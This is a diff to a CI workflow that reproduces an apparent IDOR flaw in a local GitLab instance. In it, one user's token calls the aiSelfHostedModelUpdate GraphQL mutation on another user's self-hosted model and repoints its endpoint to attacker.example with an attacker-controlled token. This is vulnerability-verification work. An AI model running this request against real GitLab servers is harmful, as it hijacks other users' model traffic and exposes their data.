@@ -173,7 +173,7 @@ jobs:
           UPDATE_RESP=$(curl -s -X POST "http://localhost:8181/api/graphql" \
             -H "Authorization: Bearer $USER_B_PAT" \
             -H "Content-Type: application/json" \
-            -d "{\"query\":\"mutation { aiSelfHostedModelUpdate(input: { id: \\\"$MODEL_GID2\\\", endpoint: \\\"https://attacker.example/v1\\\", apiToken: \\\"attacker-controlled-token\\\" }) { selfHostedModel { id endpoint } errors } }\"}")
+            -d "{\"query\":\"mutation { aiSelfHostedModelUpdate(input: { id: \\\"$MODEL_GID2\\\", name: \\\"victim-model-2\\\", model: \\\"mistral\\\", endpoint: \\\"https://attacker.example/v1\\\", apiToken: \\\"attacker-controlled-token\\\" }) { selfHostedModel { id endpoint } errors } }\"}")
           echo "Response: $UPDATE_RESP"
           echo ""
           python3 -c "
@@ -203,7 +203,9 @@ jobs:
       - name: GitLab version confirmation
         run: |
           echo "=== GitLab Version ==="
-          curl -sf http://localhost:8181/api/v4/version
+          curl -sf http://localhost:8181/api/v4/version \
+            -H "Authorization: Bearer $ROOT_PAT" | python3 -m json.tool || \
+            curl -s http://localhost:8181/api/v4/version | python3 -m json.tool || true
           echo ""
           echo "=== Image digest ==="
-          docker inspect gitlab-idor-poe --format '{{.Image}}' | head -1
+          docker inspect gitlab-idor-poe --format '{{.Image}}' | head -1 || true
